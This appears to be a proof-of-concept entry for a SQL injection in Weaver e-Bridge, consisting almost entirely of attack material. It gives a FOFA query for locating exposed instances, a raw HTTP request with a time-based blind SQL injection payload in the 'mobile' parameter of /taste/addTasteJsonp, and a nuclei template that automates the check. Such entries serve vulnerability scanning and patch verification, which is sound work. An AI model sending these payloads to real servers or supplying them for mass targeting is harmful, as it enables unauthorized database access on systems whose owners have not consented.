# fofa

```plain
app="泛微云桥e-Bridge"
```

# poc

```http
GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27+AND+%28SELECT+6488+FROM+%28SELECT%28SLEEP%286%29%29%29CvMg%29+OR+%27JmLq%27%3D%27IpuI HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

# nuclei

```yaml
id: weaver-e-Bridge-checkMobile-sqli

info:
  name: weaver e-Bridge checkMobile SQL injection
  author: zxf
  severity: high

http:
  - raw:
      - |
        GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27+AND+%28SELECT+6488+FROM+%28SELECT%28SLEEP%286%29%29%29CvMg%29+OR+%27JmLq%27%3D%27IpuI HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && duration >= 6
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738821759908-9efaf7d5-091c-4901-ac9d-d9ecb10ff9c4.png)